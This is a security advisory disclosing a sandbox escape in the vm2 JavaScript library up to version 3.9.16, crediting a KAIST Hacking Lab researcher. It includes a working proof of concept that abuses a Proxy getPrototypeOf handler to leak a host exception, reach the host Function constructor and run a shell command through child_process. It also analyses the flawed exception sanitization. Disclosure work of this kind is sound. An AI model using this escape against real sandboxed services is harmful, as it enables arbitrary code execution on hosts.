
# [](#sandbox-escape-in-vm23916)Sandbox Escape in vm2@3.9.16

## [](#summary)Summary

There exists a vulnerability in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsanitized host exception inside `handleException()` which can be used to escape the sandbox and run arbitrary code in host context.

## [](#proof-of-concept)Proof of Concept

```source-js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

## [](#analysis)Analysis

As host exceptions may leak host objects into the sandbox, code is preprocessed with `transformer()` in order to instrument the code with `handleException()` sanitizer function calls.

For `CatchClause` with `ObjectPattern` the code calls `handleException()` and then re-throws the sanitized exception inside a **nested try-catch**. ([lib/transformer.js:121](https://github.com/patriksimek/vm2/blob/3.9.16/lib/transformer.js#L121))

`handleException()` function is an alias of `thisEnsureThis()`, which in turn calls `thisReflectGetPrototypeOf(other)` (again, an alias of `Reflect.getPrototypeOf()`) to access the object's prototype ([lib/bridge.js:835](https://github.com/patriksimek/vm2/blob/3.9.16/lib/bridge.js#L835)).

However, this may be proxied through a `getPrototypeOf()` proxy handler which can by itself throw an unsanitized host exception, resulting in the outer catch statement receiving it.

An attacker may use any method to raise a non-proxied host exception ([test/vm.js:1082](https://github.com/patriksimek/vm2/blob/3.9.16/test/vm.js#L1082) for example) inside a `getPrototypeOf()` proxy handler, register it to an object and throw it to leak host exception, and finally use it to access host `Function`, escaping the sandbox.

## [](#impact)Impact

Remote Code Execution, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.

## [](#credits)Credits

[Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/)
